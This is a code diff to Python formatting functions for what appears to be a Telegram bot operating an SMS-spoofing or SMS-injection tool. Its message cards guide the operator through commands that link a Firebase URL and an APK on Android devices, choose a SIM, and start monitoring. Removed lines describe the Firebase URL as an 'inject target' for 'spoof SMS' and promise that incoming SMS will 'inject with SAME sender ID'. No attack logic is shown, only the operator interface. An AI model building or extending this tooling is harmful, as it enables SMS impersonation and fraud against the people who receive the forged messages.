@@ -22,15 +22,20 @@ def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
     )
 
 
-def format_firebase_connected_card(firebase_url: str, online_count: int) -> str:
+def format_firebase_connected_card(firebase_url: str, online_count: int, total: int = 0) -> str:
+    device_line = (
+        f"📱 Devices Found: {total} (online: {online_count})"
+        if total
+        else "📱 Devices: 0 (koi bhi Firebase chalega — /fy se device add karo)"
+    )
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Firebase Connected!\n\n"
         f"URL: {firebase_url}\n"
-        f"📱 Online Devices Found: {online_count}"
+        f"{device_line}"
         "</pre>\n\n"
-        "Next Step: /setdevice"
+        "Next: /fy &lt;device_id&gt; ya /key &lt;same-url&gt;"
     )
 
 
@@ -340,9 +345,10 @@ def format_key_error_card() -> str:
         "<pre>"
         "Usage: /key KEY-XXXX-XXXX-XXXX\n"
         "Example: /key KEY-BQUB-J7LC-EWI1-RW94\n\n"
-        "Or Firebase URL:\n"
-        "/key https://your-app.firebaseio.com\n\n"
-        "This is your inject target (like /mynum for spoof SMS)."
+        "Or koi bhi Firebase URL:\n"
+        "/key https://your-app.firebaseio.com\n"
+        "/key your-app-default-rtdb.firebaseio.com\n\n"
+        "Empty Firebase bhi chalega — devices baad mein add karo."
         "</pre>"
     )
 
@@ -369,8 +375,8 @@ def format_license_key_set_card(firebase_url: str) -> str:
         "<pre>"
         "License Key Set!\n\n"
         f"🔑 {firebase_url.upper()}\n\n"
-        "Next: /fy &lt;device_id&gt; → pick SIM → /addchannel → /startmonitor\n"
-        "Incoming SMS will inject with SAME sender ID."
+        "Koi bhi Firebase URL chalega — APK mein bhi same daalo\n\n"
+        "Next: /fy &lt;device_id&gt; → SIM → /mynum → /startmonitor"
         "</pre>"
     )
 
